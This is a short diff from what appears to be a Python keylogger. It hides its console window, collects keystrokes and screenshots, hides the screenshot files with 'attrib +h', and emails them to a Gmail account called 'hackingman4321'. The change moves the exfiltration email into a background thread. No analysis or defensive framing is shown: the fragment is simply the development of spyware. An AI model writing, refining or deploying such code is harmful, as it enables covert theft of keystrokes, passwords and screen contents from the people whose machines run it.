@@ -13,8 +13,7 @@ from email.message import EmailMessage
 from threading import Thread
 from time import time, sleep
 import imghdr
-import ctypes
-from subprocess import Popen, call
+from subprocess import call
   
 win = win32console.GetConsoleWindow()
 keys = []
@@ -66,6 +65,10 @@ def sendEmail():
             file_name = f.name
             call('attrib +h {}'.format(screenshot), creationflags= 0x08000000)
         msg.add_attachment(file_data, maintype='image', subtype=file_type, filename=file_name)
+    t3 = Thread(target=chuck_email, args=(msg, password,))
+    t3.start()
+
+def chuck_email(msg,password):
     conn.login('hackingman4321@gmail.com', password)
     conn.send_message(msg)
 
